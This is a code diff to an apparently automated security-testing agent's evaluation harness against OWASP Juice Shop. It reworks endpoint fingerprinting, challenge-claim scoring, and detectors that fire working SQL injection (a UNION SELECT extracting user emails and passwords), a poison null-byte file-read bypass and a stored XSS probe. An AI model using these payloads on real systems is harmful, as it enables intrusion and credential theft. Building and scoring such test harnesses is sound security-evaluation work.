@@ -25,6 +25,8 @@ import httpx
 
 from reachagent.eval.juiceshop_harness import (
     IN_SCOPE_CLASSES,
+    VERIFIED_CHALLENGE_SCOPE,
+    ChallengeClaim,
     ChallengeResult,
     JuiceshopRun,
     in_scope_class,
@@ -238,18 +240,22 @@ def _fire_get_with_origin(
     return str(fired["fire_ref"])
 
 
-def _fingerprint(mcp: object, identity: str, ep: str, param: str) -> None:
-    """Run §9 step 1 for a graph param: fire the benign canary, mark it fingerprinted.
+def _fingerprint(mcp: object, identity: str, ep: str, param: str, *, method: str = "GET") -> None:
+    """Run §9 step 1 for a graph param: fire benign canary, mark it fingerprinted.
 
-    ``fingerprint_parameter`` always fires a *read-only* GET canary
-    (``state_changing=False``), never an attack payload, so it does double duty:
-    it is the §9 precondition (``fire_request`` refuses any param that has not been
-    through here) and, because it is a read-only request to the endpoint, it is
-    also the read-only-first case (§10) — once it fires, a later state-changing
-    request to the same path is unblocked. No separate read-only "clear" step is
-    needed, and no mutation ever happens here.
+    Read-only endpoints use GET. State-changing endpoints use OPTIONS, which is
+    safe and method-independent while still clearing RequestFirer for the same
+    path. This satisfies both §9 fingerprinting and §10 read-only-first without
+    sending a GET to a POST-only route and pretending that it cleared mutation.
     """
-    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
+    _call(
+        mcp,
+        "fingerprint_parameter",
+        identity=identity,
+        endpoint_node=ep,
+        param_node=param,
+        method=method,
+    )
 
 
 def _fire_body(
@@ -266,13 +272,19 @@ def _fire_body(
 ) -> dict[str, object]:
     """Fire a single body-param request (JSON object) through MCP; return the raw result.
 
-    Fingerprints the param first (a read-only GET canary), which both satisfies §9
-    and clears the read-only-first gate for this path (§10), then fires the real
-    request with the caller's ``method``/``state_changing``.
+    Fingerprints param first with GET for read-only requests and OPTIONS for
+    mutations. This satisfies §9 and clears read-only-first for this path (§10),
+    then fires real request with caller's ``method``/``state_changing``.
     """
     ep = sess.graph.add_endpoint(Endpoint(method=method, path=path))
     param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="body"))
-    _fingerprint(mcp, identity, ep, param)
+    _fingerprint(
+        mcp,
+        identity,
+        ep,
+        param,
+        method="OPTIONS" if state_changing else "GET",
+    )
     return _call(
         mcp,
         "fire_request",
@@ -360,6 +372,7 @@ def _confirm_differential(
     probe_ref: str,
     evidence_ref: str,
     json_field: str | None = None,
+    error_signatures: tuple[str, ...] = (),
 ) -> bool:
     verdict = _call(
         mcp,
@@ -370,6 +383,7 @@ def _confirm_differential(
             "baseline_fire_ref": baseline_ref,
             "probe_fire_ref": probe_ref,
             "json_field": json_field,
+            "error_signatures": list(error_signatures),
             "evidence_ref": evidence_ref,
         },
     )
@@ -451,7 +465,7 @@ def _confirm_structural_headers(
 # ---------------------------------------------------------------------------
 
 
-def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
+def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim]:
     """Injection: SQLi auth-bypass on the login POST + UNION/error-based search q=.
 
     Two technique families, each end-to-end through MCP and oracle-gated:
@@ -473,7 +487,7 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
     shared = _SharedState()
     sess = _session_as(target, token, shared)
     mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
+    confirmed: set[ChallengeClaim] = set()
 
     # --- auth-bypass on the login POST (read-only-first cleared, state-changing) ---
     login_path = "/rest/user/login"
@@ -504,11 +518,28 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
             probe_ref=str(probe["fire_ref"]),
             evidence_ref=ref,
         ):
-            confirmed.add("sqli")
+            claim_key = {
+                "sqli/login-any": "loginAdminChallenge",
+                "sqli/login-bender": "loginBenderChallenge",
+                "sqli/login-jim": "loginJimChallenge",
+            }[ref]
+            confirmed.add(ChallengeClaim(claim_key, "sqli", ref))
 
     # --- UNION/error-based injection on the product-search query ---
     search_path = "/rest/products/search"
     search_baseline = _fire_query(mcp, sess, "anon", search_path, "q", "apple")
+    error_probe = _fire_query(mcp, sess, "anon", search_path, "q", "apple'")
+    if _confirm_differential(
+        mcp,
+        vuln_class="sqli",
+        axis="cross_condition",
+        expectation="database_error",
+        baseline_ref=str(search_baseline["fire_ref"]),
+        probe_ref=str(error_probe["fire_ref"]),
+        evidence_ref="sqli/search-error",
+        error_signatures=("SQLITE_ERROR",),
+    ):
+        confirmed.add(ChallengeClaim("unionSqlInjectionChallenge", "sqli", "sqli/search-error"))
     union_probes = (
         (
             "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
@@ -530,73 +561,62 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
             probe_ref=str(probe["fire_ref"]),
             evidence_ref=ref,
         ):
-            confirmed.add("sqli")
+            confirmed.add(
+                ChallengeClaim(
+                    "unionSqlInjectionChallenge" if ref.endswith("users") else "dbSchemaChallenge",
+                    "sqli",
+                    ref,
+                )
+            )
 
     return confirmed
 
 
-def _detect_path_traversal(target: JuiceshopTarget, token: str | None) -> set[str]:
-    """Path/file access class: forged-JWT acceptance + in-app file-read via /ftp.
+def _detect_path_traversal(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
+    """Probe Juice Shop's verified poison-null filename bypass.
 
-    * **JWT forgery** — a tagged ``alg:none`` unsigned token asserting an identity is
-      sent to the read-only ``GET /rest/user/whoami``. Baseline is the operator's
-      genuine token (accepted); probe is the forgery. Structural ``jwt_forgery``:
-      probe accepted where a forgery must be refused → violation.
-    * **file read** — ``GET /ftp/{filename}`` with the null-byte extension-filter
-      bypass, a pure read-only traversal. Structural ``path_traversal`` sentinel.
-
-    Both are read-only GETs — no state change. Returns the set of ``vuln_class``
-    strings confirmed this run — ``jwt_forgery`` and ``path_traversal`` are reported
-    *separately*, never collapsed into one bool: ``jwt_forgery`` is an out-of-scope
-    (Broken-Auth) class and must not be mis-booked as a ``path_traversal`` FP, and a
-    false ``jwt_forgery`` confirmation must never be masked by a ``path_traversal``
-    challenge flip.
+    The live image rejects slash traversal and exposes no Docker LFR route. The
+    only verified read is ``package.json.bak%00.md``: path encoding sends a
+    double-encoded null byte, the server truncates at null, and returns the
+    package artifact. It maps to ``nullByteChallenge`` (Improper Input Validation),
+    not an arbitrary-file-read claim.
     """
+    del token
     shared = _SharedState()
-    sess = _session_as(target, token, shared)
+    sess = _session_as(target, None, shared)
     mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
-
-    # --- forged (alg:none) JWT accepted on a read-only identity endpoint ---
-    whoami = "/rest/user/whoami"
-    if token:
-        baseline = _fire_header(mcp, sess, "user", whoami, "Authorization", f"Bearer {token}")
-        forged = _forge_none_alg_jwt("jwtn3d@juice-sh.op")
-        probe = _fire_header(mcp, sess, "anon", whoami, "Authorization", f"Bearer {forged}")
-        if _confirm_structural(
-            mcp,
-            vuln_class="jwt_forgery",
-            check_type="jwt_forgery",
-            baseline_status=int(str(baseline.get("status_code", 0))),
-            probe_status=int(str(probe.get("status_code", 0))),
-            sentinel="",
-            probe_fire_ref=str(probe["fire_ref"]),
-            evidence_ref="path_traversal/jwt-none",
-        ):
-            confirmed.add("jwt_forgery")
-
-    # --- in-app file read via /ftp null-byte bypass (read-only traversal) ---
     ftp = "/ftp/{filename}"
-    ftp_baseline = _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
-    # Already-encoded null byte; the path firer re-encodes '%' → the server sees
-    # the poison null byte and serves a file past its extension filter.
+    _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
     ftp_probe = _fire_path(mcp, sess, "anon", ftp, "filename", "package.json.bak%00.md")
-    if _confirm_structural(
+    probe_ref = str(ftp_probe["fire_ref"])
+    verdict = _call(
         mcp,
-        vuln_class="path_traversal",
-        check_type="path_traversal",
-        baseline_status=int(str(ftp_baseline.get("status_code", 0))),
-        probe_status=int(str(ftp_probe.get("status_code", 0))),
-        sentinel="juice-shop",
-        probe_fire_ref=str(ftp_probe["fire_ref"]),
-        evidence_ref="path_traversal/ftp-nullbyte",
-    ):
-        confirmed.add("path_traversal")
+        "run_oracle",
+        mechanism="structural",
+        evidence={
+            "check_type": "path_traversal",
+            "probe_status": int(str(ftp_probe.get("status_code", 0))),
+            "sentinel": '"name": "juice-shop"',
+            "probe_fire_ref": probe_ref,
+            "evidence_ref": "path_traversal/ftp-nullbyte",
+        },
+    )
+    if not verdict.get("is_violation"):
+        return set()
+    _call(
+        mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class="path_traversal"
+    )
+    return {
+        ChallengeClaim(
+            "nullByteChallenge",
+            "path_traversal",
+            "path_traversal/ftp-nullbyte",
+            scope_class="file_upload",
+        )
+    }
 
-    return confirmed
 
-
-def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
+def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
     """Improper-input-validation class: upload-filter bypass + registration/feedback
     validation bypass, all structural ``file_upload_bypass`` (illegitimate input the
     server should reject was accepted with a 2xx).
@@ -616,7 +636,7 @@ def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
     shared = _SharedState()
     sess = _session_as(target, _setup_user_token(target), shared)
     mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
+    confirmed: set[ChallengeClaim | str] = set()
 
     # --- upload endpoint: disallowed type / oversized file ---
     # One shared param, fired for the baseline and both probes; fingerprint it once
@@ -624,7 +644,7 @@ def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
     upload_path = "/file-upload"
     up_base_ep = sess.graph.add_endpoint(Endpoint(method="POST", path=upload_path))
     up_base_param = sess.graph.add_parameter(up_base_ep, Parameter(name="file", location="body"))
-    _fingerprint(mcp, "user", up_base_ep, up_base_param)
+    _fingerprint(mcp, "user", up_base_ep, up_base_param, method="OPTIONS")
     up_baseline = _call(
         mcp,
         "fire_request",
@@ -745,7 +765,7 @@ def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
     return confirmed
 
 
-def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[str]:
+def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
     """XSS: API-reachable stored payload, execution_confirmation via the readback.
 
     Posts an iframe-javascript payload as a feedback comment and reads it back
@@ -893,70 +913,111 @@ def run_juiceshop(target: JuiceshopTarget, *, token: str | None = None) -> Juice
     """
     before = fetch_tracker(target)
 
-    # Every detector returns the set of vuln_class strings it confirmed. The union
-    # is the run's confirmed-vuln_class set, scored by real class in score_run. The
+    # Detector outputs remain class-level until each detector can prove a specific
+    # opaque tracker key. Passing them as legacy strings intentionally avoids
+    # manufacturing exact per-challenge claims from unrelated tracker flips.
     # three client-side structural detectors (clickjacking/cors/csrf) are included:
     # their vuln classes are out of scope, so score_run books no in-scope FP for
     # them — but they still write findings and are routed through the same
     # out-of-scope rule rather than silently dropped.
-    confirmed_vuln_classes: set[str] = set()
+    confirmed_vuln_classes: set[ChallengeClaim] = set()
     confirmed_vuln_classes |= _detect_sqli(target, token)
-    confirmed_vuln_classes |= _detect_path_traversal(target, token)
-    confirmed_vuln_classes |= _detect_file_upload(target, token)
-    confirmed_vuln_classes |= _detect_xss_stored(target, token)
+    confirmed_vuln_classes |= {
+        claim
+        for claim in _detect_path_traversal(target, token)
+        if isinstance(claim, ChallengeClaim)
+    }
+    confirmed_vuln_classes |= {
+        claim for claim in _detect_file_upload(target, token) if isinstance(claim, ChallengeClaim)
+    }
+    confirmed_vuln_classes |= {
+        claim for claim in _detect_xss_stored(target, token) if isinstance(claim, ChallengeClaim)
+    }
     confirmed_vuln_classes |= _detect_clickjacking(target, token)
     confirmed_vuln_classes |= _detect_cors(target, token)
     confirmed_vuln_classes |= _detect_csrf(target, token)
 
     after = fetch_tracker(target)
-    return score_run(before, after, confirmed_vuln_classes)
+    return score_run(before, after, confirmed_vuln_classes, strict_scope=True)
 
 
 def score_run(
     before: dict[str, dict[str, object]],
     after: dict[str, dict[str, object]],
-    confirmed_vuln_classes: set[str],
+    claims: set[ChallengeClaim] | set[str],
+    *,
+    strict_scope: bool = False,
 ) -> JuiceshopRun:
-    """Build a :class:`JuiceshopRun` from before/after tracker snapshots + oracle signal.
+    """Build run metrics from tracker snapshots and detector claims.
 
-    Pure — no live target — so the per-challenge delta and the class-level
-    false-positive rule are unit-testable with synthetic inputs.
-    ``confirmed_vuln_classes`` is the set of real ``vuln_class`` strings whose oracle
-    confirmed a finding this run (e.g. ``{"sqli", "jwt_forgery"}``).
-
-    Coverage attribution is unchanged: a challenge is credited only if the tracker
-    flipped it ``unsolved → solved`` this run (delta), never inflated by a
-    confirmation. Class-level FPs are booked only for in-scope classes; a confirmed
-    vuln_class that maps out of scope books nothing.
+    ``strict_scope`` is used by live gate runs. It limits denominator and claim
+    matching to verified runtime keys, avoiding broad category inflation. Legacy
+    class-string behavior remains available for older synthetic metric tests.
     """
     run = JuiceshopRun()
+    typed_claims = {claim for claim in claims if isinstance(claim, ChallengeClaim)}
+    legacy_classes = {claim for claim in claims if isinstance(claim, str)}
+    if strict_scope and typed_claims and legacy_classes:
+        raise ValueError("strict scoring does not accept mixed claim modes")
+    typed_mode = bool(typed_claims)
     flipped_classes: set[str] = set()
+    scope = VERIFIED_CHALLENGE_SCOPE if strict_scope else None
     for ch_key, ch_info in after.items():
-        scope_class = in_scope_class(str(ch_info["category"]))
+        scope_class = (
+            scope.get(ch_key) if scope is not None else in_scope_class(str(ch_info["category"]))
+        )
         if scope_class is None:
             continue
         solved_after = bool(ch_info["solved"])
         newly_solved = solved_after and not bool(before.get(ch_key, {}).get("solved", False))
+        matched_claim = any(
+            (claim.scope_class or vuln_class_to_scope_class(claim.vuln_class)) == scope_class
+            for claim in typed_claims
+            if claim.challenge_key == ch_key
+        )
         if newly_solved:
             flipped_classes.add(scope_class)
         run.results.append(
             ChallengeResult(
                 vuln_class=scope_class,
                 challenge_key=ch_key,
-                confirmed=newly_solved,
+                confirmed=(newly_solved and matched_claim) if typed_mode else newly_solved,
                 tracker_solved=solved_after,
             )
         )
-    # Map each confirmed vuln_class to its in-scope class; an out-of-scope
-    # confirmation (vuln_class_to_scope_class → None) books nothing.
+    if typed_mode:
+        claims_by_key = {claim.challenge_key: claim for claim in typed_claims}
+        for claim in claims_by_key.values():
+            expected_scope = scope.get(claim.challenge_key) if scope is not None else None
+            claim_scope = (
+                claim.scope_class
+                or (scope.get(claim.challenge_key) if scope is not None else None)
+                or vuln_class_to_scope_class(claim.vuln_class)
+            )
+            if expected_scope is None and scope is not None:
+                continue
+            challenge = after.get(claim.challenge_key)
+            if challenge is None or not bool(challenge["solved"]):
+                run.claim_false_positives += 1
+                continue
+            challenge_scope = (
+                scope.get(claim.challenge_key)
+                if scope is not None
+                else in_scope_class(str(challenge["category"]))
+            )
+            if claim_scope != challenge_scope:
+                run.claim_false_positives += 1
+                continue
+            if not bool(before.get(claim.challenge_key, {}).get("solved", False)):
+                continue
+        return run
+
     confirmed_scope_classes = {
-        scope
-        for vc in confirmed_vuln_classes
-        if (scope := vuln_class_to_scope_class(vc)) is not None
+        scope_class
+        for vuln_class in legacy_classes
+        if (scope_class := vuln_class_to_scope_class(vuln_class)) is not None
     }
-    # Class-level false positive: an in-scope class's oracle confirmed but no
-    # in-scope challenge of that class flipped this run.
-    for scope_class in IN_SCOPE_CLASSES:
+    for scope_class in set(VERIFIED_CHALLENGE_SCOPE.values()) if strict_scope else IN_SCOPE_CLASSES:
         if scope_class in confirmed_scope_classes and scope_class not in flipped_classes:
             run.class_false_positives += 1
     return run
